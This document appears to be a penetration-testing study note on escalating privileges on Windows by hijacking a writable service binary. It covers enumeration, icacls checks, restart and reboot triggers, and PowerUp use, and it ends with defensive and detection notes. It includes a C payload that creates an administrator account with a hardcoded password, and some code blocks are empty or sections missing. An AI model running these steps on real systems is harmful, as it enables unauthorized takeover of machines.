## Overview

Windows services execute a configured binary when the service starts.

If a low-privileged user can modify or replace that binary, the user may be able to execute arbitrary code with the privileges assigned to the service.

High-value service accounts include:

```text
LocalSystem
LocalService
NetworkService
privileged domain service accounts
```

The general methodology is:

```text
Enumerate installed services
↓
Identify non-standard service binaries
↓
Check service execution account
↓
Check binary and directory permissions
↓
Confirm the binary is writable
↓
Determine whether the service can be restarted
↓
Back up and replace the binary
↓
Restart the service or reboot
↓
Execute payload in the service context
↓
Restore the original binary
```

> [!important]
> The vulnerability is not simply that a service runs with high privileges. The escalation exists because an unprivileged user can modify something the privileged service executes.

---

# Why Service Binary Hijacking Matters

Each Windows service has an associated executable path.

Example:

```text
C:\xampp\mysql\bin\mysqld.exe
```

If that service runs as:

```text
LocalSystem
```

and the current user can replace `mysqld.exe`, the replacement binary will execute as `SYSTEM` when the service next starts.

Potential outcomes include:

- creating a local administrator
- adding the current user to Administrators
- executing a reverse shell
- writing a SYSTEM proof file
- changing permissions
- launching another escalation stage

---

# Requirements

A successful service binary hijack usually requires:

```text
a Windows service using a file writable by the current user
the service running as a more privileged account
a way to restart the service or reboot the host
a payload compatible with the target architecture
```

Useful conditions:

```text
service binary writable
service directory writable
service configured for automatic startup
current user has service restart rights
current user has SeShutdownPrivilege
scheduled or expected service restart
```

# 2. Prioritise Non-Standard Services

User-installed services are often more promising than Windows system services.

High-interest paths include:

```text
C:\xampp\
C:\Program Files\<vendor>\
C:\Program Files (x86)\<vendor>\
C:\ProgramData\
C:\Tools\
custom application directories
```

Lower-priority paths include standard Windows binaries such as:

```text
C:\Windows\System32\svchost.exe
C:\Windows\System32\services.exe
```

Ask:

```text
Was this software installed by a third party?
Is the directory under vendor control rather than Windows?
Does the path contain custom arguments or config files?
Does the service run as LocalSystem?
```

# 3. Identify the Service Account

Using PowerShell:

```powershell
Get-CimInstance -ClassName Win32_Service |
Select-Object Name, StartName, PathName |
Where-Object {$_.Name -eq "<service_name>"}
```

Using `sc`:

```cmd
sc qc <service_name>
```

High-value accounts:

```text
LocalSystem
NT AUTHORITY\SYSTEM
LocalService
NetworkService
DOMAIN\service-account
```

Example result:

```text
SERVICE_START_NAME : LocalSystem
```

This means the service binary executes with SYSTEM privileges.

---

# 4. Parse the Service Binary Path Carefully

A service path may contain both the executable and command-line arguments.

Example:

```text
C:\xampp\mysql\bin\mysqld.exe --defaults-file=C:\xampp\mysql\bin\my.ini mysql
```

The actual binary is:

```text
C:\xampp\mysql\bin\mysqld.exe
```

The remainder is arguments:

```text
--defaults-file=C:\xampp\mysql\bin\my.ini mysql
```

> [!important]
> Check permissions on the actual executable, not the full `PathName` string.

---

# 5. Check Binary Permissions

## icacls

```cmd
icacls "C:\path\to\service.exe"
```

Example:

```cmd
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

Common permission masks:

| Mask | Permission |
|---|---|
| `F` | Full control |
| `M` | Modify |
| `RX` | Read and execute |
| `R` | Read |
| `W` | Write |

High-risk examples:

```text
BUILTIN\Users:(F)
BUILTIN\Users:(M)
Authenticated Users:(F)
Authenticated Users:(M)
Everyone:(F)
Everyone:(M)
```

Safe-looking example:

```text
BUILTIN\Users:(RX)
```

---

# Permission Interpretation

Example vulnerable result:

```text
C:\path\service.exe BUILTIN\Users:(F)
```

This means members of `Users` can:

```text
read
write
replace
delete
change attributes
```

Example non-vulnerable result:

```text
BUILTIN\Users:(RX)
```

This allows execution but not replacement.

---

# Inherited vs Explicit Permissions

Permissions may be marked with inheritance flags.

Common indicators:

```text
(I) inherited
(OI) object inherit
(CI) container inherit
```

An entry without `(I)` may have been set directly on the file.

Example:

```text
BUILTIN\Users:(F)
```

This may indicate an explicit permission rather than one inherited from the parent directory.

---

# 6. Check Directory Permissions

Even if the binary itself is not writable, the containing directory may be.

```cmd
icacls "C:\path\to\directory"
```

Example:

```cmd
icacls "C:\xampp\mysql\bin"
```

A writable directory may allow:

- deleting and replacing the binary
- renaming the original
- planting a replacement file
- modifying related configuration files

Search parent directories as well:

```cmd
icacls "C:\xampp"
icacls "C:\xampp\mysql"
icacls "C:\xampp\mysql\bin"
```

# 7. PowerShell ACL Enumeration

```powershell
Get-Acl "C:\path\to\service.exe" | Format-List
```

Inspect access entries:

```powershell
(Get-Acl "C:\path\to\service.exe").Access
```

Filter for common low-privileged principals:

```powershell
(Get-Acl "C:\path\to\service.exe").Access |
Where-Object {
    $_.IdentityReference -match "Users|Authenticated Users|Everyone"
}
```

# 8. Confirm Current User Membership

```cmd
whoami
```

```cmd

```

Check whether the user belongs to the principal holding write permissions.

Example:

```text
BUILTIN\Users
```

Most normal local users are members of this group.

# 9. Determine Whether the Service Can Be Restarted

## Attempt Manual Restart

Stop:

```cmd
net stop <service_name>
```

Start:

```cmd
net start <service_name>
```

Alternative:

```cmd
sc stop <service_name>
sc start <service_name>
```

If successful, the payload can be triggered immediately.

---

## Access Denied

Typical result:

```text
System error 5 has occurred.

Access is denied.
```

This means the current user cannot control the service directly.

Do not assume the path is unusable. Check whether:

```text
service starts automatically
machine can be rebooted
service restarts on failure
service is periodically restarted
administrator action will trigger it
```

# 10. Check Startup Mode

PowerShell:

```powershell
Get-CimInstance -ClassName Win32_Service |
Select-Object Name, StartMode |
Where-Object {$_.Name -eq "<service_name>"}
```

Example:

```text
Name   StartMode
----   ---------
mysql  Auto
```

Using `sc`:

```cmd
sc qc <service_name>
```

Look for:

```text
START_TYPE : 2 AUTO_START
```

If the service is set to automatic, it should start during boot.

---

# 11. Check Reboot Privilege

```cmd
whoami /priv
```

Look for:

```text
SeShutdownPrivilege
```

Example:

```text
SeShutdownPrivilege    Shut down the system    Disabled
```

The `Disabled` state does not necessarily mean the user lacks the privilege. It may mean the current process is not actively using it.

If listed, the user may be able to initiate a reboot.

# 12. Reboot Considerations

Reboot command:

```cmd
shutdown /r /t 0
```

Arguments:

| Argument | Purpose |
|---|---|
| `/r` | Reboot |
| `/t 0` | Reboot immediately |

> [!warning]
> Do not reboot production systems without explicit approval and coordination. Reboots may cause service disruption, data loss, or prolonged downtime.

Preferred trigger order:

```text
restart service directly
restart dependent application
wait for scheduled restart
coordinate reboot
reboot only when explicitly permitted
```

# 13. Back Up the Original Binary

Before replacing the service binary, preserve the original.

Example:

```cmd
copy "C:\path\service.exe" "C:\Users\Public\service.exe.bak"
```

or:

```cmd
move "C:\path\service.exe" "C:\Users\<user>\service.exe.bak"
```

PowerShell:

```powershell
Copy-Item "C:\path\service.exe" "C:\Users\Public\service.exe.bak"
```

> [!important]
> Backing up the original makes cleanup and restoration possible.

# 14. Payload Options

The replacement executable must be a valid Windows executable compatible with the target architecture.

Common controlled payload objectives:

```text
create a temporary local administrator
add an existing user to Administrators
write proof of execution
launch a reverse shell
copy a privileged file
change ACLs
```

For labs, a simple account-creation binary is easy to validate.

# 15. Example C Payload – Create Local Administrator

```c
#include <stdlib.h>

int main()
{
    system("net user svcadmin Password123! /add");
    system("net localgroup administrators svcadmin /add");

    return 0;
}
```

Save as:

```text

```

> [!warning]
> Hardcoded credentials should only be used in controlled lab environments. Remove the account during cleanup.

## Find Modifiable Service Files

```powershell
Get-ModifiableServiceFile
```

Useful output fields:

| Field | Meaning |
|---|---|
| `ServiceName` | Vulnerable service |
| `Path` | Configured service path |
| `ModifiableFile` | Writable binary or related file |
| `ModifiableFilePermissions` | Effective permissions |
| `ModifiableFileIdentityReference` | Principal with modification rights |
| `StartName` | Service account |
| `CanRestart` | Whether current user can restart it |
| `AbuseFunction` | Suggested PowerUp action |

High-value result:

```text
StartName  : LocalSystem
CanRestart : False
```

Interpretation:

```text
The service is privileged and vulnerable, but another trigger is required.
```

PowerUp may recommend:

```powershell
Install-ServiceBinary -Name '<service_name>'
```

Example:


> Always review the function before using it. Automated exploitation changes the target system.

# 24. Automated Tool Limitations

Automated tools may identify a service correctly but fail to exploit it.

One common cause is a service path containing arguments with additional filesystem paths.

Example:

```text
C:\xampp\mysql\bin\mysqld.exe --defaults-file=C:\xampp\mysql\bin\my.ini mysql
```

A parser may incorrectly treat the full string as one modifiable path.

Possible result:

```text
Service binary is not modifiable by the current user
```

even though:

```cmd
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

shows the binary is writable.

> [!important]
> Use automated tools for discovery, then manually validate permissions and paths.

---

# 25. Manual Validation of PowerUp Findings

Test the exact executable path:

```powershell
echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
```

Adding a simple argument:

```powershell
echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
```

Adding an argument containing another path may cause parsing problems:

```powershell
echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
```

If automated exploitation fails:

```text
extract the executable manually
check it with icacls
check the parent directory
replace it manually
trigger the service manually or through reboot
```

# Decision Tree

## Is the Service Privileged?

Check:

```powershell
Get-CimInstance Win32_Service |
Where-Object {$_.Name -eq "<service>"} |
Select Name,StartName
```

If it runs as a low-privileged user, hijacking may not provide escalation.

---

## Is the Binary Writable?

```cmd
icacls "C:\path\service.exe"
```

If yes, continue.

If no, check the parent directory and configuration files.

---

## Can the Service Be Restarted?

```cmd
net stop <service>
```

If yes:

```text
replace binary and restart
```

If no:

```text
check automatic startup
check reboot privilege
check failure actions
wait for legitimate restart
```

---

## Is the Service Automatic?

```cmd
sc qc <service>
```

If `AUTO_START`, reboot may trigger it when explicitly authorised.

---

## Does PowerUp Flag It but Exploitation Fails?

Manually parse the binary path and verify with `icacls`.

Do not dismiss the finding solely because the abuse function failed.

# Troubleshooting

## Get-CimInstance Returns Access Denied

Try:

```cmd
sc query
sc qc <service>
```

or use an interactive session such as RDP.

---

## Binary Is Writable but Cannot Be Replaced

Check:

```text
file is locked
directory permissions
delete permission
antivirus protection
application self-protection
```

Try renaming instead of overwriting:

```cmd
move "C:\path\service.exe" "C:\path\service.exe.bak"
```

---

## Service Cannot Be Stopped

Check:

```text
CanRestart value from PowerUp
service ACL
automatic startup
SeShutdownPrivilege
scheduled reboot or restart
```

---

## Service Starts but Payload Does Not Execute

Check:

```text
payload architecture
valid PE executable
service executable expectations
working directory assumptions
payload crashes immediately
AV/EDR blocking
service start timeout
```

Use a simple proof payload first.

---

## Service Fails After Replacement

The Service Control Manager may report a timeout if the payload does not behave like a normal service binary.

The payload may still have executed.

Validate the side effect:

```cmd
net localgroup administrators
```

or:

```cmd
type C:\Windows\Temp\proof.txt
```

---

## PowerUp Reports a False Negative

Manually check:

```cmd
icacls "<actual_executable_path>"
```

PowerUp may misparse arguments containing paths.

# Defensive Notes

## Root Cause

Service binary hijacking occurs when:

```text
a privileged service executes a binary
and
an unprivileged user can modify or replace that binary
```

Common causes:

- overly permissive file ACLs
- overly permissive directory ACLs
- vendor installers assigning `Users:(F)`
- administrators granting Full Control to solve application errors
- custom service binaries stored in writable locations
- poor separation between application users and service accounts

---

# Mitigations

Defensive actions:

```text
restrict service binary write permissions
restrict parent directory permissions
allow only SYSTEM and Administrators to modify privileged service files
run services with least-privileged accounts
audit custom and third-party services
avoid broad Users or Everyone permissions
monitor service executable changes
use application allowlisting
review service restart permissions
```

Recommended ACL model:

```text
SYSTEM: Full Control
Administrators: Full Control
Users: Read and Execute
```

---

# Detection Ideas

Monitor for:

```text
changes to service executable files
renaming of service binaries
new PE files in service directories
service start failures after binary modification
new local administrator accounts
unexpected net user commands
unexpected net localgroup administrators commands
service binary hash changes
PowerUp execution
```

Suspicious sequence:

```text
low-privileged user enumerates services
↓
icacls against service binary
↓
original binary renamed
↓
new executable written
↓
service restarted or host rebooted
↓
local administrator created
```

---

# Key Takeaways

- Every Windows service executes a configured binary.
- A privileged service with a writable binary can provide privilege escalation.
- Third-party and custom service directories should be prioritised.
- Always separate the executable path from its arguments.
- `icacls` is the quickest way to validate effective file permissions.
- `F` and `M` permissions for low-privileged groups are high-risk.
- Check both the binary and its parent directories.
- If service restart is denied, check automatic startup and reboot rights.
- Reboots should only be performed with explicit authorisation.
- PowerUp is useful for discovery but may fail to exploit valid findings.
- Always back up and restore the original service binary.
